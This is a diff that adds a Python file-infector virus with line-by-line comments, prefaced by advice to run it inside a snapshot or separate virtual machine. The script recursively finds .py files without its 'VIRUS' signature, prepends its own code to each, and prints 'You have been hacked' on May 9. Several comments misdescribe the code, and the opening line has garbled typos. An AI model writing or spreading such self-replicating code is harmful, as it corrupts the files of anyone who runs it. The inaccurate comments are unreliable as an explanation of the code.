@@ -1,1 +1,54 @@
+This script, either backup your VM using Virtualbox Snapshot 0r create a se14rate VM for testing.
+
+#!/usr/bin/python # permission to use the python interpreter
+import os # imports the security and library utility modules
+import datetime #This lines imports the date and time
+
+SIGNATURE = "VIRUS" #Assigning the variable VIRUS to SIGNATURE
+
+# the function will append some words into an empty array and return the array "files_targeted"
+def locate(path): # defining the function
+    files_targeted = [] # an empty array
+    filelist = os.listdir(path) # assigning the path list to filelist
+
+# a for loop that checks if fname is in filelist and run a conditional statement
+#that checks if the file is infected or not and breaks if it is infected
+    for fname in filelist:
+        if os.path.isdir(path+"/"+fname):
+            files_targeted.extend(locate(path+"/"+fname))
+        elif fname[-3:] == ".py":
+            infected = False
+            for line in open(path+"/"+fname):
+                if SIGNATURE in line:
+                    infected = True
+                    break
+            if infected == False:
+                files_targeted.append(path+"/"+fname)
+    return files_targeted # returning the array
+
+# A function checking for files infected by a virus
+def infect(files_targeted):
+    virus = open(os.path.abspath(__file__)) #assigning the file path to the variable virus
+    virusstring = "" # declaring an empty string
+    for i,line in enumerate(virus): # a for loop checking for virus          
+        if i&gt;=0 and i &lt;39:
+            virusstring += line # increment by one to keep the loop running until the condition is no longer true
+    virus.close #closing the file to prevent memory leak
+    for fname in files_targeted: # another for loop checking for files in a files_targeted
+        f = open(fname) #opening a file
+        temp = f.read() #reading a file
+        f.close() 
+        f = open(fname,"w") #open the file  and make it available for user to write to it.     
+        f.write(virusstring + temp) #writing content to the file
+        f.close() # close the file
+
+#the function validates the current date with may 9th and will display user has been hacked on the screen
+def detonate():
+    # The user will be alerted of a hack if the date is between may 5th and may9th.
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+        print "You have been hacked" # print the message on the screen
+        
+ files_targeted = locate(os.path.abspath("")) # storing the list of infected file that were output when the code ran.
+ infect(files_targeted)
+ detonate()
 
